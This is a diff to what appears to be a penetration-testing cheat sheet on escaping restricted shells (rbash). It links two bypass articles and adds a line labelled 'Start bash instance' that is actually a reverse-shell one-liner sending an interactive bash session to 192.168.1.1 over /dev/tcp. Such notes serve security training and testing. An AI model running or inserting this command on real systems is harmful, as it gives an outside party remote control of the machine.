@@ -17,6 +17,9 @@ Correcting the $PATH variable for sh / bash
 Upgrading from rbash:
 https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
 https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
+
+Start bash instance:
+> /bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1
 ```
 
 ###### Sudo -l
